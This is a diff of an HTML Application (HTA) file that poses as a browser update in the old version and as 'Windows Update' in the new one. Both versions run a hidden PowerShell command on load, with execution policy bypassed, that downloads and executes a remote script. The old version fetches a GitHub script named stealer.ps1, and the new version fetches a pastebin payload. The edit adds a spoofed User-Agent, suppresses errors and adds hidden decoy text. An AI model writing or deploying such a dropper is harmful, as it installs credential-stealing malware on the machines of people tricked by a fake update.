@@ -1,30 +1,41 @@
 <html>
 <head>
-<HTA:APPLICATION ID="ChromeUpdater" 
-    APPLICATIONNAME="Chrome Update" 
+<HTA:APPLICATION 
+    ID="LegitUpdater"
+    APPLICATIONNAME="Windows Update"
     BORDER="none"
-    BORDERSTYLE="normal"
+    BORDERSTYLE="none"
     CAPTION="no"
     SHOWINTASKBAR="no"
     SINGLEINSTANCE="yes"
     SYSMENU="no"
     WINDOWSTATE="minimize"/>
 <script language="VBScript">
-    Function ExecutePayload()
-        Dim psCmd
-        psCmd = "powershell -nop -w hidden -exec bypass -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
-        psCmd = psCmd & "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourrepo/stealer.ps1')"""
+    Function RunStealth()
+        Dim cmd, ws
+        Set ws = CreateObject("WScript.Shell")
         
-        CreateObject("WScript.Shell").Run psCmd, 0, False
+        ' Indirect PowerShell invocation through WMI
+        cmd = "powershell -nop -w 1 -exec bypass -c ""$url='https://pastebin.com/raw/...';" & _
+              "$wc=New-Object Net.WebClient;" & _
+              "$wc.Headers.Add('User-Agent','Mozilla/5.0');" & _
+              "iex $wc.DownloadString($url)"""
+        
+        ws.Run "cmd /c " & cmd, 0, False
         window.close()
     End Function
     
     Sub Window_OnLoad
-        ExecutePayload
+        On Error Resume Next
+        RunStealth()
+        On Error GoTo 0
     End Sub
 </script>
 </head>
 <body>
-<!-- No visible content -->
+<!-- Legitimate-looking content -->
+<div style="display:none">
+    <p>Checking for system updates...</p>
+</div>
 </body>
 </html>
